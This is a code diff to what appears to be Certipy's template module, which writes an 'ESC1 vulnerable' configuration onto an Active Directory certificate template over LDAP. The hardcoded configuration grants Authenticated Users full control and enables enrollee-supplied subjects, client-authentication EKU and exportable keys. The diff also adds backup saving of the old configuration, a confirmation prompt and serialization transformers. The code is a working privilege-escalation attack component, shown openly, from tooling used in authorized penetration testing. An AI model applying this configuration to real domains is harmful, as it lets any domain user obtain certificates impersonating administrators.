@@ -17,10 +17,24 @@ from ldap3.core.results import RESULT_INSUFFICIENT_ACCESS_RIGHTS
 from ldap3.protocol.microsoft import security_descriptor_control
 from ldap3.utils.conv import escape_filter_chars
 
+from certipy.lib.constants import (
+    OID_TO_STR_NAME_MAP,
+    CertificateNameFlag,
+    EnrollmentFlag,
+    PrivateKeyFlag,
+    TemplateFlags,
+)
 from certipy.lib.files import try_to_save_file
 from certipy.lib.ldap import LDAPConnection, LDAPEntry
 from certipy.lib.logger import logging
+from certipy.lib.security import create_authenticated_users_sd
 from certipy.lib.target import Target
+from certipy.lib.time import (
+    SECONDS_PER_WEEK,
+    SECONDS_PER_YEAR,
+    filetime_to_span,
+    span_to_filetime,
+)
 
 # Attributes that should not be modified to avoid breaking template functionality
 PROTECTED_ATTRIBUTES = [
@@ -46,30 +60,83 @@ PROTECTED_ATTRIBUTES = [
 # ESC1 vulnerable template configuration with full control for 'Authenticated Users'
 # This configuration creates a template that allows any authenticated user to enroll
 # and obtain certificates with client authentication EKU
-# TODO: Construct fields dynamically instead of hardcoding values
 CONFIGURATION_TEMPLATE = {
-    "showInAdvancedViewOnly": [b"TRUE"],
+    "showInAdvancedViewOnly": True,
     # Security descriptor giving Authenticated Users full control
-    "nTSecurityDescriptor": [
-        b"\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00"
-        b"\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00"
-        b"\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00"
-        b"\x00\x00\xc8\xa3\x1f\xdd\xe9\xba\xb8\x90,\xaes\xbb\xf4\x01\x00\x00"
+    "nTSecurityDescriptor": create_authenticated_users_sd().getData(),
+    "flags": int(
+        TemplateFlags.PUBLISH_TO_DS
+        | TemplateFlags.EXPORTABLE_KEY
+        | TemplateFlags.AUTO_ENROLLMENT
+        | TemplateFlags.ADD_TEMPLATE_NAME
+        | TemplateFlags.IS_DEFAULT
+    ),  # Template flags
+    "pKIDefaultKeySpec": 2,  # AT_SIGNATURE
+    "pKIKeyUsage": b"\x86\x00",  # Digital Signature, Key Encipherment
+    "pKIMaxIssuingDepth": -1,  # Maximum depth value for the Basic Constraint extension (-1 means no limit)
+    "pKICriticalExtensions": [
+        "2.5.29.19",  # Basic Constraints
+        "2.5.29.15",  # Key Usage
+    ],  # Critical extensions
+    "pKIExpirationPeriod": span_to_filetime(SECONDS_PER_YEAR),  # 1 year validity
+    "pKIOverlapPeriod": span_to_filetime(SECONDS_PER_WEEK * 6),  # 6 week overlap
+    "pKIExtendedKeyUsage": [
+        OID_TO_STR_NAME_MAP["client authentication"],
     ],
-    "flags": [b"0"],  # Template flags
-    "pKIDefaultKeySpec": [b"2"],  # Key spec (RSA)
-    "pKIKeyUsage": [b"\x86\x00"],  # Digital Signature, Key Encipherment
-    "pKIMaxIssuingDepth": [b"-1"],  # No constraint on issuing depth
-    "pKICriticalExtensions": [b"2.5.29.19", b"2.5.29.15"],  # Critical extensions
-    "pKIExpirationPeriod": [b"\x00@\x1e\xa4\xe8e\xfa\xff"],  # 1 year validity
-    "pKIOverlapPeriod": [b"\x00\x80\xa6\n\xff\xde\xff\xff"],  # 6 week overlap
-    "pKIDefaultCSPs": [b"1,Microsoft Enhanced Cryptographic Provider v1.0"],
-    "msPKI-RA-Signature": [b"0"],  # No RA signature required
-    "msPKI-Enrollment-Flag": [b"0"],  # No special enrollment flags
-    "msPKI-Private-Key-Flag": [b"16842768"],  # Allow export
-    "msPKI-Certificate-Name-Flag": [b"1"],  # Name flags
-    "msPKI-Minimal-Key-Size": [b"2048"],  # Minimum 2048-bit key
+    "msPKI-Certificate-Application-Policy": [
+        OID_TO_STR_NAME_MAP["client authentication"],
+    ],
+    "pKIDefaultCSPs": [
+        "2,Microsoft Base Cryptographic Provider v1.0",
+        "1,Microsoft Enhanced Cryptographic Provider v1.0",
+    ],
+    "msPKI-RA-Signature": 0,  # No recovery agent signatures required
+    "msPKI-Enrollment-Flag": int(EnrollmentFlag.NONE),  # No special enrollment flags
+    "msPKI-Private-Key-Flag": int(PrivateKeyFlag.EXPORTABLE_KEY),  # Allow export
+    "msPKI-Certificate-Name-Flag": int(
+        CertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT
+    ),  # Name flags
+    "msPKI-Minimal-Key-Size": 2048,  # Minimum 2048-bit key
 }
+
+TRANSFORMERS = {
+    "pKIOverlapPeriod": (filetime_to_span, span_to_filetime),
+    "pKIExpirationPeriod": (filetime_to_span, span_to_filetime),
+}
+
+
+def default_into_transformer(value: Any) -> Any:
+    """
+    Default transformer function that returns the value unchanged.
+
+    Args:
+        value: The value to transform
+
+    Returns:
+        The original value
+    """
+    if isinstance(value, list):
+        return [default_into_transformer(item) for item in value]
+    if isinstance(value, bytes):
+        return "HEX:" + value.hex()
+    return value
+
+
+def default_from_transformer(value: Any) -> Any:
+    """
+    Default transformer function that converts a value to its original form.
+
+    Args:
+        value: The value to transform
+
+    Returns:
+        The original value
+    """
+    if isinstance(value, list):
+        return [default_from_transformer(item) for item in value]
+    if isinstance(value, str) and value.startswith("HEX:"):
+        return bytes.fromhex(value[4:])
+    return value
 
 
 class Template:
@@ -83,9 +150,12 @@ class Template:
     def __init__(
         self,
         target: "Target",
-        template: Optional[str] = None,
-        configuration: Optional[str] = None,
-        save_old: bool = False,
+        template: str = "",
+        write_configuration: Optional[str] = None,
+        write_default_configuration: bool = False,
+        save_configuration: Optional[str] = None,
+        no_save: bool = False,
+        force: bool = False,
         connection: Optional[LDAPConnection] = None,
         **kwargs,  # type: ignore
     ):
@@ -95,16 +165,22 @@ class Template:
         Args:
             target: Target domain information
             template: Name of the certificate template to operate on
-            configuration: Path to configuration file to apply
-            save_old: Whether to save the old configuration before modifying
+            write_configuration: Path to configuration file to apply
+            write_default_configuration: Whether to apply the default configuration
+            save_configuration: Path to save the current configuration
+            no_save: Whether to skip saving the current configuration
+            force: Do not prompt for confirmation before applying changes
             scheme: LDAP connection scheme (ldap or ldaps)
             connection: Optional existing LDAP connection to reuse
             **kwargs: Additional keyword arguments
         """
         self.target = target
         self.template_name = template
-        self.configuration = configuration
-        self.save_old = save_old
+        self.write_configuration_file = write_configuration
+        self.write_default_configuration = write_default_configuration
+        self.save_configuration_file = save_configuration
+        self.no_save = no_save
+        self.force = force
         self.kwargs = kwargs
 
         self._connection = connection
@@ -143,12 +219,13 @@ class Template:
             if key in PROTECTED_ATTRIBUTES:
                 continue
 
-            if isinstance(value, list):
-                output[key] = [item.hex() for item in value]
-            else:
-                output[key] = value.hex()
+            into_transformer, _ = TRANSFORMERS.get(
+                key, (default_into_transformer, None)
+            )
 
-        return json.dumps(output, indent=2)
+            output[key] = into_transformer(value)
+
+        return json.dumps(output, indent=2, ensure_ascii=False)
 
     def get_configuration(self, template_name: str) -> Optional[LDAPEntry]:
         """
@@ -213,10 +290,10 @@ class Template:
             if key in PROTECTED_ATTRIBUTES:
                 continue
 
-            if isinstance(value, list):
-                output[key] = [bytes.fromhex(item) for item in value]
-            else:
-                output[key] = bytes.fromhex(value)
+            _, from_transformer = TRANSFORMERS.get(
+                key, (None, default_from_transformer)
+            )
+            output[key] = from_transformer(value)
 
         return output
 
@@ -250,8 +327,43 @@ class Template:
         except json.JSONDecodeError:
             logging.error(f"Invalid JSON in configuration file: {configuration_path}")
             raise ValueError("Invalid JSON in configuration file")
+        except Exception as e:
+            logging.error(f"Error loading configuration file: {e}")
+            raise
 
-    def set_configuration(self) -> bool:
+    def save_configuration(self, configuration: Optional[LDAPEntry] = None) -> None:
+        """
+        Save the current configuration to a JSON file.
+        """
+        # Get the current configuration
+        current_configuration = configuration
+        if current_configuration is None:
+            current_configuration = self.get_configuration(self.template_name)
+            if not current_configuration:
+                raise Exception(
+                    f"Failed to retrieve configuration for {self.template_name!r}. Aborting."
+                )
+
+        current_configuration_json = self.configuration_to_json(
+            current_configuration["attributes"]
+        )
+
+        out_file = (
+            self.save_configuration_file.removesuffix(".json")
+            if self.save_configuration_file
+            else current_configuration.get("cn")
+        )
+
+        out_file = f"{out_file}.json"
+        logging.info(f"Saving current configuration to {out_file!r}")
+        out_file = try_to_save_file(
+            current_configuration_json, out_file, abort_on_fail=True
+        )
+        logging.info(
+            f"Wrote current configuration for {self.template_name!r} to {out_file!r}"
+        )
+
+    def write_configuration(self) -> bool:
         """
         Apply a new configuration to a certificate template.
 
@@ -267,9 +379,11 @@ class Template:
             return False
 
         # Get the configuration to apply
-        if self.configuration:
+        if self.write_configuration_file:
             try:
-                new_configuration = self.load_configuration(self.configuration)
+                new_configuration = self.load_configuration(
+                    self.write_configuration_file
+                )
             except (FileNotFoundError, ValueError):
                 return False
         else:
@@ -282,19 +396,8 @@ class Template:
             return False
 
         # Save the old configuration if requested
-        if self.save_old:
-            old_configuration_json = self.configuration_to_json(
-                old_configuration["raw_attributes"]
-            )
-
-            template_name = old_configuration.get("cn")
-
-            out_file = f"{template_name}.json"
-            logging.info(f"Saving old configuration to {out_file!r}")
-            out_file = try_to_save_file(old_configuration_json, out_file)
-            logging.info(
-                f"Wrote old configuration for {self.template_name!r} to {out_file!r}"
-            )
+        if not self.no_save:
+            self.save_configuration(old_configuration)
 
         # Compute the changes to make
         changes = self._compute_changes(old_configuration, new_configuration)
@@ -324,7 +427,7 @@ class Template:
         changes = {}
 
         # Check for attributes to delete or modify
-        for key in old_configuration["raw_attributes"].keys():
+        for key in old_configuration["attributes"].keys():
             if key in PROTECTED_ATTRIBUTES:
                 continue
 
@@ -334,18 +437,27 @@ class Template:
                 continue
 
             # Replace attributes with new values if different
-            old_values = old_configuration.get_raw(key)
-            new_values = new_configuration[key]
+            old_value = old_configuration.get(key)
+            new_value = new_configuration[key]
 
-            if collections.Counter(old_values) != collections.Counter(new_values):
-                changes[key] = [(ldap3.MODIFY_REPLACE, new_values)]
+            if type(old_value) != type(new_value):
+                changes[key] = [(ldap3.MODIFY_REPLACE, new_value)]
+                continue
+            if isinstance(old_value, list):
+                # Check if the list values are different
+                if collections.Counter(old_value) != collections.Counter(new_value):
+                    changes[key] = [(ldap3.MODIFY_REPLACE, new_value)]
+                continue
+
+            if old_value != new_value:
+                changes[key] = [(ldap3.MODIFY_REPLACE, new_value)]
 
         # Add new attributes not in the old configuration
         for key, value in new_configuration.items():
             if (
                 key in changes
                 or key in PROTECTED_ATTRIBUTES
-                or key in old_configuration["raw_attributes"]
+                or key in old_configuration["attributes"]
             ):
                 continue
 
@@ -371,6 +483,15 @@ class Template:
 
         # Log the changes grouped by operation type
         self._log_changes(changes)
+
+        if not self.force:
+            # Ask for confirmation before applying changes
+            confirm = input(
+                f"Are you sure you want to apply these changes to {template_name!r}? (y/N): "
+            )
+            if confirm.strip().lower() != "y":
+                logging.info("Aborting changes")
+                return False
 
         # Apply the changes
         result = self.connection.modify(
@@ -409,12 +530,12 @@ class Template:
                 ldap3.MODIFY_REPLACE: "Replacing",
             }.get(op, op)
 
-            logging.debug(f"{op_name}:")
+            logging.info(f"{op_name}:")
 
             for item in list(group):
                 key = item[0]
                 value = item[1][0][1]
-                logging.debug(f"    {key}: {value!r}")
+                logging.info(f"    {key}: {value!r}")
 
 
 def entry(options: argparse.Namespace) -> None:
@@ -430,4 +551,20 @@ def entry(options: argparse.Namespace) -> None:
     options.__delattr__("target")
 
     template = Template(target=target, **vars(options))
-    _ = template.set_configuration()
+
+    will_write = (
+        template.write_default_configuration or template.write_configuration_file
+    )
+
+    if template.save_configuration_file:
+        template.save_configuration()
+
+    if will_write:
+        template.write_configuration()
+
+    # if template.write_default_configuration or template.configuration:
+    #     # Apply the configuration
+    #     if not template.set_configuration():
+    #         logging.error("Failed to set the template configuration")
+    #         return
+    # _ = template.set_configuration()
